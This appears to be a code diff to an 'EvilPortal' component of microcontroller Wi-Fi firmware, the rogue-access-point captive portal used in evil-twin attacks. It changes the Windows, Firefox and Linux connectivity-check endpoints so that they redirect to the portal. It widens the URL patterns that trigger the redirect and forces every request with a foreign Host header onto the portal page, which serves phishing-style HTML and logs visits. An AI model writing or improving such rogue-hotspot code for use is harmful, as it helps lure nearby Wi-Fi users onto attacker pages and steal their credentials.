@@ -174,12 +174,16 @@ void EvilPortal::setupRoutes() {
         request->send(response);
     });
 
-    webServer.on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
-        request->send(200, "text/plain", "Microsoft NCSI");
+    webServer.on("/ncsi.txt", HTTP_GET, [this](AsyncWebServerRequest *request) {
+        AsyncWebServerResponse *response = request->beginResponse(302);
+        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
+        request->send(response);
     });
 
-    webServer.on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
-        request->send(200, "text/plain", "Microsoft Connect Test");
+    webServer.on("/connecttest.txt", HTTP_GET, [this](AsyncWebServerRequest *request) {
+        AsyncWebServerResponse *response = request->beginResponse(302);
+        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
+        request->send(response);
     });
 
     webServer.on("/redirect", HTTP_GET, [this](AsyncWebServerRequest *request) {
@@ -188,8 +192,10 @@ void EvilPortal::setupRoutes() {
         request->send(response);
     });
 
-    webServer.on("/success.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
-        request->send(200, "text/plain", "success");
+    webServer.on("/success.txt", HTTP_GET, [this](AsyncWebServerRequest *request) {
+        AsyncWebServerResponse *response = request->beginResponse(302);
+        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
+        request->send(response);
     });
 
     webServer.on("/canonical.html", HTTP_GET, [this](AsyncWebServerRequest *request) {
@@ -204,8 +210,10 @@ void EvilPortal::setupRoutes() {
         request->send(response);
     });
 
-    webServer.on("/detectportal.firefox.com/success.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
-        request->send(200, "text/plain", "success");
+    webServer.on("/detectportal.firefox.com/success.txt", HTTP_GET, [this](AsyncWebServerRequest *request) {
+        AsyncWebServerResponse *response = request->beginResponse(302);
+        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
+        request->send(response);
     });
 
     webServer.on("/client.msftconnecttest.com/redirect", HTTP_GET, [this](AsyncWebServerRequest *request) {
@@ -241,7 +249,10 @@ void EvilPortal::setupRoutes() {
         String url = request->url();
         if (url.indexOf("detectportal") != -1 || url.indexOf("connecttest") != -1 ||
             url.indexOf("success") != -1 || url.indexOf("generate") != -1 ||
-            url.indexOf("msftconnecttest") != -1 || url.indexOf("clients3.google.com") != -1) {
+            url.indexOf("msftconnecttest") != -1 || url.indexOf("clients3.google.com") != -1 ||
+            url.indexOf("ncsi") != -1 || url.indexOf("nmcheck") != -1 || url.indexOf("gnome") != -1 ||
+            url.indexOf("ubuntu") != -1 || url.indexOf("canonical") != -1 ||
+            url.indexOf("networkcheck") != -1 || url.indexOf("hotspot") != -1) {
             AsyncWebServerResponse *response = request->beginResponse(302);
             response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
             request->send(response);
@@ -647,6 +658,14 @@ void EvilPortal::loadDefaultHtml() {
 }
 
 void EvilPortal::portalController(AsyncWebServerRequest *request) {
+    String apIp = WiFi.softAPIP().toString();
+    String host = request->host();
+    if (host.length() && host != apIp) {
+        AsyncWebServerResponse *response = request->beginResponse(302);
+        response->addHeader("Location", "http://" + apIp + "/");
+        request->send(response);
+        return;
+    }
     recordPageView();
     if (isDefaultHtml) request->send(200, "text/html", htmlPage);
     else { request->send(*fsHtmlFile, htmlFileName, "text/html"); }
